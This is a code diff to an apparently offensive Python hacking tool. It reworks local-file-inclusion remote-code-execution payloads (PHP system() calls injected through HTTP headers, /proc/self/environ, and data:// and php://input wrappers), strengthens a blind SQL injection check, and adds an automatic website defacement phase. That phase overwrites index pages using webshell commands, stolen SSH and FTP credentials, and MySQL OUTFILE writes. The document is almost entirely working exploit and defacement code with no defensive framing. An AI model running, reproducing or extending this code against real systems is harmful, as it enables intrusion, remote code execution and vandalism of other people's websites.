@@ -3260,7 +3260,8 @@ class LFIExploiter:
         for fd in range(0, 20):
             logs.append(f"../../../../../../proc/self/fd/{fd}")
 
-        php_payload = f"<?php system('{cmd}'); ?>"
+        marker = "nusa" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
+        php_payload = f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>"
         ua_headers = {
             "User-Agent": php_payload,
             "Referer": php_payload,
@@ -3268,13 +3269,10 @@ class LFIExploiter:
             "X-Forwarded-For": php_payload,
             "X-Forwarded-Host": php_payload,
         }
-        # Inject via multiple headers
         for hdr_name, hdr_val in ua_headers.items():
             try:
                 requests.get(self.url, headers={hdr_name: hdr_val}, timeout=3, verify=False)
             except: pass
-
-        # Inject with POST method too
         try:
             requests.post(self.url, data={self.param: "1"}, headers=ua_headers, timeout=3, verify=False)
         except: pass
@@ -3286,15 +3284,14 @@ class LFIExploiter:
                     r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
                 except: continue
                 if r and (txt := r.text or ""):
+                    if marker in txt:
+                        print(f"  {R}⚡{N} {BOLD}RCE via {log.split('/')[-1]}!{N}")
+                        output = txt.split(marker, 1)[1].split(marker, 1)[0].strip() if len(txt.split(marker)) > 2 else txt.split(marker)[1][:200]
+                        print(f"  {W}{output[:300]}{N}")
+                        return txt
                     if ("GET" in txt or "POST" in txt or "HTTP/" in txt) and len(txt) > 50:
-                        if cmd in txt:
-                            print(f"  {R}⚡{N} {BOLD}RCE via {log.split('/')[-1]}!{N}")
-                            output = txt.split(cmd)[-1][:200] if cmd in txt else txt[:200]
-                            print(f"  {W}{output}{N}")
-                            return txt
                         if not any(x in txt[:50] for x in ["<!DOCTYPE","<html","<head"]):
                             print(f"  {Y}⚠{N} Log readable: {Y}{log.split('/')[-1]}{N}")
-                            print(f"  {D}Send another request, then re-run this phase{N}")
                             return txt
                 if r and r.status_code == 200:
                     break
@@ -3306,8 +3303,9 @@ class LFIExploiter:
         except: result = None
         if result and "HTTP_USER_AGENT" in result:
             print(f"  {Y}⚠{N} /proc/self/environ readable! Injecting...")
+            marker = "nusa" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
             try:
-                requests.get(self.url, headers={"User-Agent": f"<?php system('{cmd}'); ?>", "X-Forwarded-For": f"<?php system('{cmd}'); ?>"}, timeout=3, verify=False)
+                requests.get(self.url, headers={"User-Agent": f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>", "X-Forwarded-For": f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>"}, timeout=3, verify=False)
             except: pass
             try:
                 for variant in self._generate_payloads("../../../../../../proc/self/environ"):
@@ -3315,7 +3313,7 @@ class LFIExploiter:
                     try:
                         r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
                     except: continue
-                    if r and (txt := r.text or "") and cmd in txt:
+                    if r and (txt := r.text or "") and marker in txt:
                         print(f"  {R}⚡{N} {BOLD}RCE via /proc/self/environ!{N}")
                         return txt
             except: pass
@@ -3323,14 +3321,17 @@ class LFIExploiter:
 
     def _try_data_wrapper(self, cmd="id"):
         """PHP input wrapper RCE via data://."""
-        b64 = base64.b64encode(f"<?php system('{cmd}'); ?>".encode()).decode()
+        marker = "nusa" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
+        b64 = base64.b64encode(f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>".encode()).decode()
         for payload in [f"data://text/plain;base64,{b64}", f"php://input&cmd={cmd}"]:
             u = self._build(payload)
             try:
                 r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
             except: continue
-            if r and (txt := r.text or "") and cmd in txt:
+            if r and (txt := r.text or "") and marker in txt:
                 print(f"  {R}⚡{N} {BOLD}RCE via data wrapper!{N}")
+                output = txt.split(marker, 1)[1].split(marker, 1)[0].strip()
+                if output: print(f"  {W}{output[:300]}{N}")
                 return txt
         return None
 
@@ -3643,7 +3644,15 @@ class BlindSQLiExploiter:
         print(f"\n  {BOLD}{C}CALIBRATE{N}")
         if not self._setup():
             print(f"  {R}✘{N} Calibration failed.\n"); return None
-        print(f"  {G}✔{N} {'Time' if self.use_time else 'Boolean'}-based injection! ({self.req_count} probe reqs)")
+        inj_type = 'Time' if self.use_time else 'Boolean'
+        print(f"  {G}✔{N} {inj_type}-based injection detected ({self.req_count} probe reqs)")
+        # Confirm with a second distinct condition to avoid false positives
+        confirm = self._true("LENGTH(database())>0")
+        if not confirm:
+            print(f"  {Y}⚠{N} Confirmation failed — likely WAF/network latency, not real injection")
+            print(f"  {D}Try: blindsqli --tech boolean (or use --delay {self.delay+1}){N}")
+            print()
+            return None
 
         print(f"\n  {BOLD}{C}DATABASE INFO{N}")
         for name, sql in [("Version","@@version"),("Database","database()"),("User","user()")]:
@@ -4208,6 +4217,110 @@ class AutoHack:
     def _log(self, phase, status, msg):
         self.phases.append({"phase": phase, "status": status, "msg": msg, "time": time.time()-self.t0})
 
+    def _deface_html(self, msg="HACKED BY NUSA EXPLOIT TEAM"):
+        return f"""<!DOCTYPE html><html><head><title>{msg}</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{{background:#000;color:#0f0;text-align:center;padding-top:15vh;font-family:monospace;overflow-x:hidden}}h1{{font-size:3.5em;text-shadow:0 0 30px #0f0;animation:blink 1.5s infinite}}@keyframes blink{{50%{{opacity:0.3}}}}.ascii{{color:#0a0;font-size:0.7em;line-height:1.2;margin:20px 0}}p{{color:#888;margin:10px 0;font-size:1.1em}}hr{{width:50%;border:1px solid #0f0;margin:30px auto}}small{{color:#555}}</style></head><body><pre class="ascii">
+  ███╗   ██╗██╗   ██╗███████╗ █████╗ 
+  ████╗  ██║██║   ██║██╔════╝██╔══██╗
+  ██╔██╗ ██║██║   ██║███████╗███████║
+  ██║╚██╗██║██║   ██║╚════██║██╔══██║
+  ██║ ╚████║╚██████╔╝███████║██║  ██║
+  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝</pre><h1>🔥 {msg} 🔥</h1><hr><p>This system has been compromised via automated exploitation.</p><p style="color:#666">All data has been reviewed. Weaknesses have been documented.</p><small>NusaTool Security Assessment — {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</small></body></html>"""
+
+    def _auto_deface(self, msg="HACKED BY NUSA EXPLOIT TEAM"):
+        """Auto deface via any RCE vector found (webshell, SSH, FTP, MySQL, LFI)."""
+        print(f"\n  {R}{BOLD}◆ PHASE 8: AUTO DEFACE{N}")
+        content = self._deface_html(msg)
+        b64 = base64.b64encode(content.encode()).decode()
+        targets = ["index.php", "index.html", "index.htm", "default.php", "default.html",
+                    "home.php", "main.php", "wp-content/themes/index.php", "wp-content/index.php"]
+        webroot = "/var/www/html"
+        vectors = []
+
+        # 1) WebShell exec_cmd
+        for s in self.results.get("shells", []):
+            su = s.get("url", "") if isinstance(s, dict) else s
+            if not su or "ssh://" in str(su): continue
+            ws = WebShell(self.base_url)
+            for tgt in targets[:4]:
+                for web in [webroot, "/var/www/", "/var/www/public/", "/usr/local/nginx/html/", "/home/www/", ""]:
+                    path = f"{web}/{tgt}" if web else tgt
+                    for cmd in [
+                        f"echo '{b64}' | base64 -d > {path} && echo OK",
+                        f"php -r \"file_put_contents('{path}',base64_decode('{b64}'));echo'OK';\"",
+                        f"printf '%s' '{content}' > {path} && echo OK",
+                    ]:
+                        try:
+                            out = ws.exec_cmd(su, cmd)
+                            if out and "OK" in out:
+                                print(f"  {G}✔{N} {BOLD}DEFACED{N} via webshell: {Y}{path}{N}")
+                                self.results.setdefault("deface_files", []).append({"method": "webshell", "path": path, "url": su.split("?")[0].rsplit("/",1)[0] + "/" + tgt})
+                                vectors.append(("webshell", path))
+                                break
+                        except: pass
+                    if vectors and vectors[-1][0] == "webshell": break
+                if vectors and vectors[-1][0] == "webshell": break
+
+        # 2) SSH exec (if we have SSH creds)
+        for cred in self.results.get("creds", []):
+            if isinstance(cred, tuple) and len(cred) >= 2:
+                try:
+                    import paramiko
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(self.domain, username=cred[0], password=cred[1], timeout=5)
+                    for tgt in targets[:3]:
+                        for web in [webroot, "/var/www/", "/home/www/"]:
+                            path = f"{web}/{tgt}"
+                            cmd = f"echo '{b64}' | base64 -d > {path} && echo OK"
+                            _, stdout, _ = client.exec_command(cmd, timeout=5)
+                            out = stdout.read().decode().strip()
+                            if "OK" in out:
+                                print(f"  {G}✔{N} {BOLD}DEFACED{N} via SSH: {Y}{path}{N}")
+                                self.results.setdefault("deface_files", []).append({"method": "ssh", "path": path})
+                                vectors.append(("ssh", path))
+                                break
+                        if vectors and vectors[-1][0] == "ssh": break
+                    client.close()
+                except: pass
+
+        # 3) FTP upload (if we have FTP creds)
+        for cred in self.results.get("creds", []):
+            if isinstance(cred, str) and "ftp://" in cred:
+                try:
+                    from urllib.parse import urlparse
+                    pu = urlparse(cred)
+                    from ftplib import FTP
+                    ftp = FTP(self.domain)
+                    ftp.login(pu.username, pu.password)
+                    for tgt in targets[:3]:
+                        try:
+                            from io import BytesIO
+                            ftp.storbinary(f"STOR {tgt}", BytesIO(content.encode()))
+                            print(f"  {G}✔{N} {BOLD}DEFACED{N} via FTP: {Y}{tgt}{N}")
+                            self.results.setdefault("deface_files", []).append({"method": "ftp", "path": tgt})
+                            vectors.append(("ftp", tgt))
+                            break
+                        except: pass
+                    ftp.quit()
+                except: pass
+
+        # 4) MySQL OUTFILE deface
+        sqli_data = self.results.get("sqli_data", {})
+        if sqli_data:
+            try:
+                sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
+                for tgt in targets[:3]:
+                    wurl = sqli.write_webshell(f"/var/www/html/{tgt}")
+                    if wurl:
+                        print(f"  {G}✔{N} {BOLD}DEFACED{N} via MySQL OUTFILE: {Y}{tgt}{N}")
+                        self.results.setdefault("deface_files", []).append({"method": "mysql_outfile", "path": tgt})
+                        vectors.append(("mysql", tgt))
+                        break
+            except: pass
+
+        if not vectors:
+            print(f"  {Y}⚠{N} No RCE vectors available for deface. Deploy a shell first.")
+
     def run(self):
         header(f"AUTO HACK — FULL AUTO EXPLOITATION")
         print(f"  {R}{BOLD}██ TARGET: {Y}{self.target}{N}")
@@ -4410,16 +4523,22 @@ class AutoHack:
                             print(f"  {Y}[−]{N} Auto-exploit {svc}: {e}")
             except: self._log("brute", "fail", svc)
 
+        # PHASE 8: AUTO DEFACE
+        deface_msg = self.results.get("deface_msg", "HACKED BY NUSA EXPLOIT TEAM")
+        self._auto_deface(deface_msg)
+
         # SUMMARY
         elapsed = time.time() - self.t0
         print(f"\n  {R}{BOLD}{'═'*55}{N}")
         print(f"  {R}{BOLD}AUTO HACK COMPLETE ({elapsed:.1f}s){N}")
         print(f"  {R}{BOLD}{'═'*55}{N}")
         print(f"\n  {R}◉{N} Ports:  {Y}{len(self.results.get('ports',[]))}{N} open")
-        print(f"  {M}◉{N} Shells: {Y}{len(self.results['shells'])}{N}")
+        shell_count = len(self.results.get("shells",[])) + len(self.results.get("deface_files",[]))
+        print(f"  {M}◉{N} Shells: {Y}{shell_count}{N}")
         has_sqli = self.results.get('sqli_data')
         print(f"  {G}◉{N} SQLi:   {Y}{len(has_sqli) if has_sqli else 'NONE'}{N}")
         print(f"  {C}◉{N} Creds:  {Y}{len(self.results.get('creds',[]))}{N}")
+        print(f"  {R}◉{N} Deface: {Y}{len(self.results.get('deface_files',[]))}{N} file(s)")
         phase_ok = sum(1 for p in self.phases if p["status"] in ("ok","sent"))
         phase_total = len(self.phases)
         print(f"  {D}◉{N} Phases: {Y}{phase_ok}/{phase_total}{N} passed")
